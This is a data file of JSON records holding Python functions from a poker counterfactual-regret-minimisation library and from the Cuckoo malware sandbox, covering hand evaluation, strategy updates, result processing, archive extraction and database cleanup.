{"docstring": "# Number of community cards dealt this round\n", "func_signal": "def cfr_boardcard_node(self, root, reachprobs):\n", "code": "num_dealt = len(root.children[0].board) - len(root.board)\n# Find the child that matches the sampled board card(s)\nfor bc in root.children:\n    if self.boardmatch(num_dealt, bc):\n        # Update the probabilities for each HC. Assume chance prob = 1 and renormalize reach probs by new holecard range\n        #next_reachprobs = [{ hc: reachprobs[player][hc] for hc in reachprobs[player] } for player in range(self.rules.players)]\n        #sumprobs = [sum(next_reachprobs[player].values()) for player in range(self.rules.players)]\n        #if min(sumprobs) == 0:\n        #    return [{ hc: 0 for hc in reachprobs[player] } for player in range(self.rules.players)]\n        #next_reachprobs = [{ hc: reachprobs[player][hc] / sumprobs[player] for hc in bc.holecards[player] } for player in range(self.rules.players)]\n        # Perform normal CFR\n        results = self.cfr_helper(bc, reachprobs)\n        # Return the payoffs\n        return results\nraise Exception('Sampling from impossible board card')", "path": "pokercfr.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# Sample all cards to be used\n", "func_signal": "def cfr(self):\n", "code": "holecards_per_player = sum([x.holecards for x in self.rules.roundinfo])\nboardcards_per_hand = sum([x.boardcards for x in self.rules.roundinfo])\ntodeal = random.sample(self.rules.deck, boardcards_per_hand + holecards_per_player * self.rules.players)\n# Deal holecards\nself.holecards = [tuple(todeal[p*holecards_per_player:(p+1)*holecards_per_player]) for p in range(self.rules.players)]\nself.board = tuple(todeal[-boardcards_per_hand:])\n# Set the top card of the deck\nself.top_card = len(todeal) - boardcards_per_hand\n# Call the standard CFR algorithm\nself.cfr_helper(self.tree.root, [1 for _ in range(self.rules.players)], 1.0)", "path": "pokercfr.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "\"\"\"\nReturn the rank of this 5-card hand amongst all 5-card hands.\n\"\"\"\n", "func_signal": "def evaluate_rank(hand):\n", "code": "if len(hand) != 5:\n    raise HandLengthException(\"Only 5-card hands are supported by the Five evaluator\")\n\n# This implementation uses the binary representation from\n# card_to_binary\ncard_to_binary = HandEvaluator.Five.card_to_binary_lookup\n\n# bh stands for binary hand\nbh = map(card_to_binary, hand)\nhas_flush = reduce(__and__, bh, 0xF000)\n# This is a unique number based on the ranks if your cards,\n# assuming your cards are all different\nq = reduce(__or__, bh) >> 16\nif has_flush:\n    # Look up the rank of this flush\n    return LookupTables.Five.flushes[q]\nelse:\n    # The q still works as a key if you have 5 unique cards,\n    # so see if we can look it up\n    possible_rank = LookupTables.Five.unique5[q]\n    if possible_rank != 0:\n        return possible_rank\n    else:\n        # We need a different lookup table with different keys\n        # Compute the unique product of primes, because we have a pair\n        # or trips, etc. Use the product to look up the rank.\n        q = reduce(mul, map(lambda card: card & 0xFF, bh))\n        # Here, use dict instead of sparse array (basically hashing)\n        # I didn't bother using \"perfect hash\", the python hashing\n        # shouldn't be terrible\n        return LookupTables.Five.pairs.get(q)", "path": "hand_evaluator.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# Update the strategies and regrets for each infoset\n", "func_signal": "def cfr_strategy_update(self, root, reachprobs):\n", "code": "for hc in reachprobs[root.player]:\n    infoset = self.rules.infoset_format(root.player, hc, root.board, root.bet_history)\n    # Get the current CFR\n    prev_cfr = self.counterfactual_regret[root.player][infoset]\n    # Get the total positive CFR\n    sumpos_cfr = float(sum([max(0,x) for x in prev_cfr]))\n    if sumpos_cfr == 0:\n        # Default strategy is equal probability\n        probs = self.equal_probs(root)\n    else:\n        # Use the strategy that's proportional to accumulated positive CFR\n        probs = [max(0,x) / sumpos_cfr for x in prev_cfr]\n    # Use the updated strategy as our current strategy\n    self.current_profile.strategies[root.player].policy[infoset] = probs\n    # Update the weighted policy probabilities (used to recover the average strategy)\n    for i in range(3):\n        self.action_reachprobs[root.player][infoset][i] += reachprobs[root.player][hc] * probs[i]\n    if sum(self.action_reachprobs[root.player][infoset]) == 0:\n        # Default strategy is equal weight\n        self.profile.strategies[root.player].policy[infoset] = self.equal_probs(root)\n    else:\n        # Recover the weighted average strategy\n        self.profile.strategies[root.player].policy[infoset] = [self.action_reachprobs[root.player][infoset][i] / sum(self.action_reachprobs[root.player][infoset]) for i in range(3)]\n# Return and use the current CFR strategy\nreturn self.current_profile.strategies[root.player]", "path": "pokercfr.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# TODO: Speedup\n# - Pre-order list of hands\n", "func_signal": "def showdown(self, root, players_in, committed, holes, board, deck, bet_history):\n", "code": "pot = sum(committed)\nshowdowns_possible = self.showdown_combinations(holes)\nif players_in.count(True) == 1:\n    fold_payoffs = [-x for x in committed]\n    fold_payoffs[players_in.index(True)] += pot\n    payoffs = { hands: fold_payoffs for hands in showdowns_possible }\nelse:\n    scores = {}\n    for i in range(self.rules.players):\n        if players_in[i]:\n            for hc in holes[i]:\n                if not (hc in scores):\n                    scores[hc] = self.rules.handeval(hc, board)\n    payoffs = { hands: self.calc_payoffs(hands, scores, players_in, committed, pot) for hands in showdowns_possible }\nreturn TerminalNode(root, committed, holes, board, deck, bet_history, payoffs, players_in)", "path": "pokertrees.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# Checks if this hand is isomorphic to the sampled hand\n", "func_signal": "def hcmatch(self, hc, player):\n", "code": "sampled = self.holecards[player][:len(hc)]\nfor c in hc:\n    if c not in sampled:\n        return False\nreturn True", "path": "pokercfr.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# Calculate strategy from counterfactual regret\n", "func_signal": "def cfr_action_node(self, root, reachprobs):\n", "code": "strategy = self.cfr_strategy_update(root, reachprobs)\nnext_reachprobs = deepcopy(reachprobs)\naction_probs = { hc: strategy.probs(self.rules.infoset_format(root.player, hc, root.board, root.bet_history)) for hc in reachprobs[root.player] }\naction_payoffs = [None, None, None]\nif root.fold_action:\n    next_reachprobs[root.player] = { hc: action_probs[hc][FOLD] * reachprobs[root.player][hc] for hc in reachprobs[root.player] }\n    action_payoffs[FOLD] = self.cfr_helper(root.fold_action, next_reachprobs)\nif root.call_action:\n    next_reachprobs[root.player] = { hc: action_probs[hc][CALL] * reachprobs[root.player][hc] for hc in reachprobs[root.player] }\n    action_payoffs[CALL] = self.cfr_helper(root.call_action, next_reachprobs)\nif root.raise_action:\n    next_reachprobs[root.player] = { hc: action_probs[hc][RAISE] * reachprobs[root.player][hc] for hc in reachprobs[root.player] }\n    action_payoffs[RAISE] = self.cfr_helper(root.raise_action, next_reachprobs)\npayoffs = []\nfor player in range(self.rules.players):\n    player_payoffs = { hc: 0 for hc in reachprobs[player] }\n    for i,subpayoff in enumerate(action_payoffs):\n        if subpayoff is None:\n            continue\n        for hc,winnings in subpayoff[player].iteritems():\n            # action_probs is baked into reachprobs for everyone except the acting player\n            if player == root.player:\n                player_payoffs[hc] += winnings * action_probs[hc][i]\n            else:\n                player_payoffs[hc] += winnings\n    payoffs.append(player_payoffs)\n# Update regret calculations\nself.cfr_regret_update(root, action_payoffs, payoffs[root.player])\nreturn payoffs", "path": "pokercfr.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "\"\"\"\nConvert the lookup_tables.Card representation to a binary\nrepresentation for use in 7-card hand evaluation\n\"\"\"\n# Same as for 6 cards\n", "func_signal": "def card_to_binary(card):\n", "code": "b_mask = 1 << (14 + card.rank)\nq_mask = LookupTables.primes[card.suit - 1] << 12\nr_mask = (card.rank - 2) << 8\np_mask = LookupTables.primes[card.rank - 2]\nreturn b_mask | q_mask | r_mask | p_mask", "path": "hand_evaluator.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# if everyone else folded, end the hand\n", "func_signal": "def build_bets(self, root, next_player, players_in, committed, holes, board, deck, bet_history, round_idx, min_actions_this_round, actions_this_round, bets_this_round):\n", "code": "if players_in.count(True) == 1:\n    self.showdown(root, players_in, committed, holes, board, deck, bet_history)\n    return\n# if everyone checked or the last raisor has been called, end the round\nif actions_this_round >= min_actions_this_round and self.all_called_last_raisor_or_folded(players_in, bets_this_round):\n    self.build_rounds(root, players_in, committed, holes, board, deck, bet_history, round_idx + 1)\n    return\ncur_round = self.rules.roundinfo[round_idx]\nanode = ActionNode(root, committed, holes, board, deck, bet_history, next_player, self.rules.infoset_format)\n# add the node to the information set\nif not (anode.player_view in self.information_sets):\n    self.information_sets[anode.player_view] = []\nself.information_sets[anode.player_view].append(anode)\n# get the next player to act\nnext_player = self.get_next_player(next_player, players_in)\n# add a folding option if someone has bet more than this player\nif committed[anode.player] < max(committed):\n    self.add_fold_child(anode, next_player, players_in, committed, holes, board, deck, bet_history, round_idx, min_actions_this_round, actions_this_round, bets_this_round)\n# add a calling/checking option\nself.add_call_child(anode, next_player, players_in, committed, holes, board, deck, bet_history, round_idx, min_actions_this_round, actions_this_round, bets_this_round)\n# add a raising option if this player has not reached their max bet level\nif cur_round.maxbets[anode.player] > max(bets_this_round):\n    self.add_raise_child(anode, next_player, players_in, committed, holes, board, deck, bet_history, round_idx, min_actions_this_round, actions_this_round, bets_this_round)\nreturn anode", "path": "pokertrees.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# Update the strategies and regrets for each infoset\n", "func_signal": "def cfr_strategy_update(self, root, reachprobs, sampleprobs):\n", "code": "hc = self.holecards[root.player][0:len(root.holecards[root.player])]\ninfoset = self.rules.infoset_format(root.player, hc, root.board, root.bet_history)\n# Get the current CFR\nprev_cfr = self.counterfactual_regret[root.player][infoset]\n# Get the total positive CFR\nsumpos_cfr = float(sum([max(0,x) for x in prev_cfr]))\nif sumpos_cfr == 0:\n    # Default strategy is equal probability\n    probs = self.equal_probs(root)\nelse:\n    # Use the strategy that's proportional to accumulated positive CFR\n    probs = [max(0,x) / sumpos_cfr for x in prev_cfr]\n# Use the updated strategy as our current strategy\nself.current_profile.strategies[root.player].policy[infoset] = probs\n# Update the weighted policy probabilities (used to recover the average strategy)\nfor i in range(3):\n    self.action_reachprobs[root.player][infoset][i] += reachprobs[root.player] * probs[i] / sampleprobs\nif sum(self.action_reachprobs[root.player][infoset]) == 0:\n    # Default strategy is equal weight\n    self.profile.strategies[root.player].policy[infoset] = self.equal_probs(root)\nelse:\n    # Recover the weighted average strategy\n    self.profile.strategies[root.player].policy[infoset] = [self.action_reachprobs[root.player][infoset][i] / sum(self.action_reachprobs[root.player][infoset]) for i in range(3)]\n# Return and use the current CFR strategy\nreturn self.current_profile.strategies[root.player]", "path": "pokercfr.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# Sample all cards to be used\n", "func_signal": "def cfr(self):\n", "code": "holecards_per_player = sum([x.holecards for x in self.rules.roundinfo])\nboardcards_per_hand = sum([x.boardcards for x in self.rules.roundinfo])\ntodeal = random.sample(self.rules.deck, boardcards_per_hand + holecards_per_player * self.rules.players)\n# Deal holecards\nself.holecards = [tuple(todeal[p*holecards_per_player:(p+1)*holecards_per_player]) for p in range(self.rules.players)]\nself.board = tuple(todeal[-boardcards_per_hand:])\n# Set the top card of the deck\nself.top_card = len(todeal) - boardcards_per_hand\n# Call the standard CFR algorithm\nself.cfr_helper(self.tree.root, [1 for _ in range(self.rules.players)])", "path": "pokercfr.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# Assume everyone is in\n", "func_signal": "def build(self):\n", "code": "players_in = [True] * self.rules.players\n# Collect antes\ncommitted = [self.rules.ante] * self.rules.players\nbets = [0] * self.rules.players\n# Collect blinds\nnext_player = self.collect_blinds(committed, bets, 0)\nholes = [()] * self.rules.players\nboard = ()\nbet_history = \"\"\nself.root = self.build_rounds(None, players_in, committed, holes, board, self.rules.deck, bet_history, 0, bets, next_player)", "path": "pokertrees.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "\"\"\"\nReturn the rank amongst all possible 5-card hands of any kind\nusing the best 5-card hand from the given 6-card hand.\n\"\"\"\n", "func_signal": "def evaluate_rank(hand):\n", "code": "if len(hand) != 6:\n    raise HandLengthException(\"Only 6-card hands are supported by the Six evaluator\")\n\n# bh stands for binary hand, map to that representation\ncard_to_binary = HandEvaluator.Six.card_to_binary_lookup\nbh = map(card_to_binary, hand)\n        \n# We can determine if it's a flush using a lookup table.\n# Basically use prime number trick but map to bool instead of rank\n# Once you have a flush, there is no other higher hand you can make\n# except straight flush, so just need to determine the highest flush\nflush_prime = reduce(mul, map(lambda card: (card >> 12) & 0xF, bh))\nflush_suit = False\nif flush_prime in LookupTables.Six.prime_products_to_flush:\n    flush_suit = LookupTables.Six.prime_products_to_flush[flush_prime]\n        \n# Now use ranks to determine hand via lookup\nodd_xor = reduce(__xor__, bh) >> 16\neven_xor = (reduce(__or__, bh) >> 16) ^ odd_xor\n# If you have a flush, use odd_xor to find the rank\n# That value will have either 4 or 5 bits\nif flush_suit:\n    if even_xor == 0:\n        # There might be 0 or 1 cards in the wrong suit, so filter\n        # TODO: There might be a faster way?\n        bits = reduce(__or__, map(\n            lambda card: (card >> 16),\n            filter(\n                lambda card: (card >> 12) & 0xF == flush_suit, bh)))\n        return LookupTables.Six.flush_rank_bits_to_rank[bits]\n    else:\n        # you have a pair, one card in the flush suit,\n        # so just use the ranks you have by or'ing the two\n        return LookupTables.Six.flush_rank_bits_to_rank[odd_xor | even_xor]\n        \n# Otherwise, get ready for a wild ride:\n        \n# Can determine this by using 2 XORs to reduce the size of the\n# lookup. You have an even number of cards, so any odd_xor with\n# an odd number of bits set is not possible.\n# Possibilities are odd-even:\n# 6-0 => High card or straight (1,1,1,1,1,1)\n#   Look up by odd_xor\n# 4-1 => Pair (1,1,1,1,2)\n#   Look up by even_xor (which pair) then odd_xor (which set of kickers)\n# 4-0 => Trips (1,1,1,3)\n#   Don't know which one is the triple, use prime product of ranks\n# 2-2 => Two pair (1,1,2,2)\n#   Look up by odd_xor then even_xor (or vice-versa)\n# 2-1 => Four of a kind (1,1,4) or full house (1,3,2)\n#   Look up by prime product\n# 2-0 => Full house using 2 trips (3,3)\n#   Look up by odd_xor\n# 0-3 => Three pairs (2,2,2)\n#   Look up by even_xor\n# 0-2 => Four of a kind with pair (2,4)\n#   Look up by prime product\n        \n# Any time you can't disambiguate 2/4 or 1/3, use primes.\n# We also assume you can count bits or determine a power of two.\n# (see PopCount class.)\n\nif even_xor == 0: # x-0\n    odd_popcount = PopCount.popcount(odd_xor)\n    if odd_popcount == 4: # 4-0\n        prime_product = reduce(mul, map(lambda card: card & 0xFF, bh))\n        return LookupTables.Six.prime_products_to_rank[prime_product]\n    else: # 6-0, 2-0\n        return LookupTables.Six.odd_xors_to_rank[odd_xor]\nelif odd_xor == 0: # 0-x\n    even_popcount = PopCount.popcount(even_xor)\n    if even_popcount == 2: # 0-2\n        prime_product = reduce(mul, map(lambda card: card & 0xFF, bh))\n        return LookupTables.Six.prime_products_to_rank[prime_product]\n    else: # 0-3\n        return LookupTables.Six.even_xors_to_rank[even_xor]\nelse: # odd_popcount is 4 or 2\n    odd_popcount = PopCount.popcount(odd_xor)\n    if odd_popcount == 4: # 4-1\n        return LookupTables.Six.even_xors_to_odd_xors_to_rank[even_xor][odd_xor]\n    else: # 2-x\n        even_popcount = PopCount.popcount(even_xor)\n        if even_popcount == 2: # 2-2\n            return LookupTables.Six.even_xors_to_odd_xors_to_rank[even_xor][odd_xor]\n        else: # 2-1\n            prime_product = reduce(mul, map(lambda card: card & 0xFF, bh))\n            return LookupTables.Six.prime_products_to_rank[prime_product]", "path": "hand_evaluator.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "\"\"\"\nA fast way to calculate binomial coefficients by Andrew Dalke (contrib).\n\"\"\"\n", "func_signal": "def choose(n, k):\n", "code": "if 0 <= k <= n:\n    ntok = 1\n    ktok = 1\n    for t in xrange(1, min(k, n - k) + 1):\n        ntok *= n\n        ktok *= t\n        n -= 1\n    return ntok // ktok\nelse:\n    return 0", "path": "pokerstrategy.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "\"\"\"Converts data dict to JSON.\n@param data: data dict\n@return: JSON formatted data or HttpResponse object with json data\n\"\"\"\n", "func_signal": "def jsonize(data, response=False):\n", "code": "if response:\n    jdata = json.dumps(data, sort_keys=False, indent=4)\n    return HttpResponse(jdata,\n                        content_type=\"application/json; charset=UTF-8\")\nelse:\n    return json.dumps(data, sort_keys=False, indent=4)", "path": "web\\api\\views.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "# This is the results container. It's what will be used by all the\n# reporting modules to make it consumable by humans and machines.\n# It will contain all the results generated by every processing\n# module available. Its structure can be observed through the JSON\n# dump in the analysis' reports folder. (If jsondump is enabled.)\n", "func_signal": "def process(target=None, copy_path=None, task=None, report=False, auto=False):\n", "code": "results = { }\nresults[\"statistics\"] = { }\nresults[\"statistics\"][\"processing\"] = list()\nresults[\"statistics\"][\"signatures\"] = list()\nresults[\"statistics\"][\"reporting\"] = list()\nGetFeeds(results=results).run()\nRunProcessing(task=task, results=results).run()\nRunSignatures(task=task, results=results).run()\ntask_id = task[\"id\"]\nif report:\n    if repconf.mongodb.enabled:\n        host = repconf.mongodb.host\n        port = repconf.mongodb.port\n        db = repconf.mongodb.db\n        conn = MongoClient(host, port)\n        mdata = conn[db]\n        analyses = mdata.analysis.find({\"info.id\": int(task_id)})\n        if analyses.count() > 0:\n            log.debug(\"Deleting analysis data for Task %s\" % task_id)\n            for analysis in analyses:\n                for process in analysis[\"behavior\"][\"processes\"]:\n                    for call in process[\"calls\"]:\n                        mdata.calls.remove({\"_id\": ObjectId(call)})\n                mdata.analysis.remove({\"_id\": ObjectId(analysis[\"_id\"])})\n        conn.close()\n        log.debug(\"Deleted previous MongoDB data for Task %s\" % task_id)\n\n    if repconf.elasticsearchdb.enabled and not repconf.elasticsearchdb.searchonly:\n        analyses = es.search(\n                       index=fullidx,\n                       doc_type=\"analysis\",\n                       q=\"info.id: \\\"%s\\\"\" % task_id\n                   )[\"hits\"][\"hits\"]\n        if analyses:\n            for analysis in analyses:\n                esidx = analysis[\"_index\"]\n                esid = analysis[\"_id\"]\n                # Check if behavior exists\n                if analysis[\"_source\"][\"behavior\"]:\n                    for process in analysis[\"_source\"][\"behavior\"][\"processes\"]:\n                        for call in process[\"calls\"]:\n                            es.delete(\n                                index=esidx,\n                                doc_type=\"calls\",\n                                id=call,\n                            )\n                # Delete the analysis results\n                es.delete(\n                    index=esidx,\n                    doc_type=\"analysis\",\n                    id=esid,\n                )\n\n    RunReporting(task=task, results=results).run()\n    Database().set_status(task_id, TASK_REPORTED)\n\n    if auto:\n        if cfg.cuckoo.delete_original and os.path.exists(target):\n            os.unlink(target)\n\n        if cfg.cuckoo.delete_bin_copy and os.path.exists(copy_path):\n            os.unlink(copy_path)", "path": "utils\\process.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"Connects to libvirt subsystem.\n    @raise CuckooMachineError: when unable to connect to libvirt.\n    \"\"\"\n# Check if a connection string is available.\n\n", "func_signal": "def _connect(self, label=None):\n", "code": "dsn = self.options.get(label).get(\"dsn\", None)\n\nif not dsn:\n    raise CuckooMachineError(\"You must provide a proper \"\n                             \"connection string for \"+label)\n\ntry:\n    return libvirt.open(dsn)\nexcept libvirt.libvirtError:\n    raise CuckooMachineError(\"Cannot connect to libvirt\")", "path": "modules\\machinery\\kvmremote.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"Remove an analysis.\n@todo: remove folder from storage.\n\"\"\"\n", "func_signal": "def remove(request, task_id):\n", "code": "if enabledconf[\"mongodb\"]:\n    analyses = results_db.analysis.find({\"info.id\": int(task_id)})\n    # Checks if more analysis found with the same ID, like if process.py was run manually.\n    if analyses.count() > 1:\n        message = \"Multiple tasks with this ID deleted.\"\n    elif analyses.count() == 1:\n        message = \"Task deleted.\"\n\n    if analyses.count() > 0:\n        # Delete dups too.\n        for analysis in analyses:\n            # Delete calls.\n            for process in analysis.get(\"behavior\", {}).get(\"processes\", []):\n                for call in process[\"calls\"]:\n                    results_db.calls.remove({\"_id\": ObjectId(call)})\n            # Delete analysis data.\n            results_db.analysis.remove({\"_id\": ObjectId(analysis[\"_id\"])})\n    else:\n        return render(request, \"error.html\",\n                                  {\"error\": \"The specified analysis does not exist\"})\nif es_as_db:\n    analyses = es.search(\n                   index=fullidx,\n                   doc_type=\"analysis\",\n                   q=\"info.id: \\\"%s\\\"\" % task_id\n               )[\"hits\"][\"hits\"]\n    if len(analyses) > 1:\n        message = \"Multiple tasks with this ID deleted.\"\n    elif len(analyses) == 1:\n        message = \"Task deleted.\"\n    if len(analyses) > 0:\n        for analysis in analyses:\n            esidx = analysis[\"_index\"]\n            esid = analysis[\"_id\"]\n            # Check if behavior exists\n            if analysis[\"_source\"][\"behavior\"]:\n                for process in analysis[\"_source\"][\"behavior\"][\"processes\"]:\n                    for call in process[\"calls\"]:\n                        es.delete(\n                            index=esidx,\n                            doc_type=\"calls\",\n                            id=call,\n                        )\n            # Delete the analysis results\n            es.delete(\n                index=esidx,\n                doc_type=\"analysis\",\n                id=esid,\n            )\n\n# Delete from SQL db.\ndb = Database()\ndb.delete_task(task_id)\n\nreturn render(request, \"success_simple.html\",\n                          {\"message\": message})", "path": "web\\analysis\\views.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"Connects to Elasticsearch database, loads options and set connectors.\n@raise CuckooReportError: if unable to connect.\n\"\"\"\n", "func_signal": "def connect(self):\n", "code": "self.es = Elasticsearch(\n    hosts = [{\n        'host': self.options.get(\"host\", \"127.0.0.1\"),\n        'port': self.options.get(\"port\", 9200),\n    }],\n    timeout = 60\n)", "path": "modules\\reporting\\elasticsearchdb.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"Test All Key Expansions\"\"\"\n", "func_signal": "def test_keys(self):\n", "code": "import test_keys\ntest_data = test_keys.TestKeys()\nfor key_size in 128, 192, 256:\n    test_expander = KeyExpander(key_size)\n    test_expanded_key = test_expander.expand(test_data.test_key[key_size])\n    self.assertEqual (len([i for i, j in zip(test_expanded_key, test_data.test_expanded_key_validated[key_size]) if i == j]),\n        len(test_data.test_expanded_key_validated[key_size]),\n        msg='Key expansion ' + str(key_size) + ' bit')", "path": "lib\\cuckoo\\common\\peepdf\\aespython\\key_expander.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"\nIf file is a ZIP, extract its included files and return their file paths\nIf file is an email, extracts its attachments and return their file paths (later we'll also extract URLs)\nIf file is a password-protected Office doc and password is supplied, return path to decrypted doc\n\"\"\"\n\n", "func_signal": "def demux_sample(filename, package, options):\n", "code": "magic = File(filename).get_type()\n\n# if file is an Office doc and password is supplied, try to decrypt the doc\nif \"Microsoft\" in magic or \"Composite Document File\" in magic or \"CDFV2 Encrypted\" in magic:\n    password = None\n    if \"password=\" in options:\n        fields = options.split(\",\")\n        for field in fields:\n            try:\n                key, value = field.split(\"=\", 1)\n                if key == \"password\":\n                    password = value\n                    break\n            except:\n                pass\n    if password:\n        return demux_office(filename, password)\n    else:\n        return [filename]\n\n# if a package was specified, then don't do anything special\n# this will allow for the ZIP package to be used to analyze binaries with included DLL dependencies\n# do the same if file= is specified in the options\nif package or \"file=\" in options:\n    return [ filename ]\n\n# don't try to extract from Java archives or executables\nif \"Java Jar\" in magic:\n    return [ filename ]\nif \"PE32\" in magic or \"MS-DOS executable\" in magic:\n    return [ filename ]\n\nretlist = demux_zip(filename, options)\nif not retlist:\n    retlist = demux_rar(filename, options)\nif not retlist:\n    retlist = demux_tar(filename, options)\nif not retlist:\n    retlist = demux_email(filename, options)\nif not retlist:\n    retlist = demux_msg(filename, options)\n# handle ZIPs/RARs inside extracted files\nif retlist:\n    newretlist = []\n    for item in retlist:\n        zipext = demux_zip(item, options)\n        if zipext:\n            newretlist.extend(zipext)\n        else:\n            rarext = demux_rar(item, options)\n            if rarext:\n                newretlist.extend(rarext)\n            else:\n                tarext = demux_tar(item, options)\n                if tarext:\n                    newretlist.extend(tarext)\n                else:\n                    newretlist.append(item)\n    retlist = newretlist\n\n# if it wasn't a ZIP or an email or we weren't able to obtain anything interesting from either, then just submit the\n# original file\n\nif not retlist:\n    retlist.append(filename)\n\nreturn retlist", "path": "lib\\cuckoo\\common\\demux.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "#Debugging output helper\n", "func_signal": "def hex_output(self, list):\n", "code": "result = '['\nfor i in list[:-1]:\n    result += hex(i) + ','\nreturn result + hex(list[-1]) + ']'", "path": "lib\\cuckoo\\common\\peepdf\\aespython\\test_keys.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"Read configuration.\n    @param module_name: module name.\n\"\"\"\n", "func_signal": "def _initialize(self, module_name):\n", "code": "super(KVMRemote, self)._initialize(module_name)\n\nhypervs_labels = self.options.get(\"kvmremote\")[\"hypervisors\"]\nhypervs_labels = (\"\".join(hypervs_labels.split())).split(\",\")\n\nfor machine in self.machines():\n    machine_cfg = self.options.get(machine.label)\n\n    if machine_cfg.hypervisor:\n        if machine_cfg.hypervisor not in hypervs_labels:\n            raise CuckooCriticalError(\n                \"Unknown hypervisor %s for %s\" % (machine_cfg.hypervisor, machine.label))\n\n        hyperv_cfg = self.options.get(machine_cfg.hypervisor)\n\n        machine_cfg.dsn = hyperv_cfg.dsn\n        machine_cfg.interface = hyperv_cfg.interface", "path": "modules\\machinery\\kvmremote.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"\n    Expand the encryption key per AES key schedule specifications\n\n    http://en.wikipedia.org/wiki/Rijndael_key_schedule#Key_schedule_description\n\"\"\"\n#First n bytes are copied from key\n", "func_signal": "def expand(self, new_key):\n", "code": "len_new_key = len(new_key)\nif len_new_key != self._n:\n    raise RuntimeError('expand(): key size is invalid')\nrcon_iter = 1\nnex=new_key.extend\n\n#Grow the key until it is the correct length\nwhile 1:\n    #Copy last 4 bytes of extended key, apply core, increment i(rcon_iter),\n    #core Append the list of elements 1-3 and list comprised of element 0 (circular rotate left)\n    #core For each element of this new list, put the result of sbox into output array.\n    #xor with 4 bytes n bytes from end of extended key\n    keyarr=[sbox[i] for i in new_key[-3:]+new_key[-4:-3]]\n    #First byte of output array is XORed with rcon(iter)\n    keyarr[0] ^= rcon[rcon_iter]\n    nex(map(xor,keyarr, new_key[-self._n:4-self._n]))\n    rcon_iter += 1\n    len_new_key += 4\n\n    #Run three passes of 4 byte expansion using copy of 4 byte tail of extended key\n    #which is then xor'd with 4 bytes n bytes from end of extended key\n    for j in 0,1,2:\n        nex(map(xor,new_key[-4:], new_key[-self._n:4-self._n]))\n        len_new_key += 4\n    if len_new_key >= self._b:return new_key\n    else:\n        #If key length is 256 and key is not complete, add 4 bytes tail of extended key\n        #run through sbox before xor with 4 bytes n bytes from end of extended key\n        if self._key_length == 256:\n            nex(map(xor,[sbox[x] for x in new_key[-4:]], new_key[-self._n:4-self._n]))\n            len_new_key += 4\n            if len_new_key >= self._b:return new_key\n\n        #If key length is 192 or 256 and key is not complete, run 2 or 3 passes respectively\n        #of 4 byte tail of extended key xor with 4 bytes n bytes from end of extended key\n        if self._key_length != 128:\n            for j in ((0,1) if self._key_length == 192 else (0,1,2)):\n                nex(map(xor,new_key[-4:], new_key[-self._n:4-self._n]))\n                len_new_key += 4\n            if len_new_key >= self._b:return new_key", "path": "lib\\cuckoo\\common\\peepdf\\aespython\\key_expander.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"Run analysis.\n@return: list of dropped files with related information.\n\"\"\"\n", "func_signal": "def run(self):\n", "code": "self.key = \"dropped\"\ndropped_files = []\nbuf = self.options.get(\"buffer\", 8192)\n\nif self.task[\"category\"] == \"pcap\":\n    return dropped_files\n\nfile_names = os.listdir(self.dropped_path)\nfor file_name in file_names:\n    file_path = os.path.join(self.dropped_path, file_name)\n    if not os.path.isfile(file_path):\n        continue\n    if file_name.endswith(\"_info.txt\"):\n        continue\n    guest_paths = [line.strip() for line in open(file_path + \"_info.txt\")]\n    guest_name = guest_paths[0].split(\"\\\\\")[-1]\n    file_info = File(file_path=file_path,guest_paths=guest_paths, file_name=guest_name).get_all()\n    texttypes = [\n        \"ASCII\",\n        \"Windows Registry text\",\n        \"XML document text\",\n        \"Unicode text\",\n    ]\n    readit = False\n    for texttype in texttypes:\n        if texttype in file_info[\"type\"]:\n            readit = True\n            break\n    if readit:\n        with open(file_info[\"path\"], \"r\") as drop_open:\n            filedata = drop_open.read(buf + 1)\n        if len(filedata) > buf:\n            file_info[\"data\"] = convert_to_printable(filedata[:buf] + \" <truncated>\")\n        else:\n            file_info[\"data\"] = convert_to_printable(filedata)\n\n    dropped_files.append(file_info)\n\nreturn dropped_files", "path": "modules\\processing\\dropped.py", "repo_name": 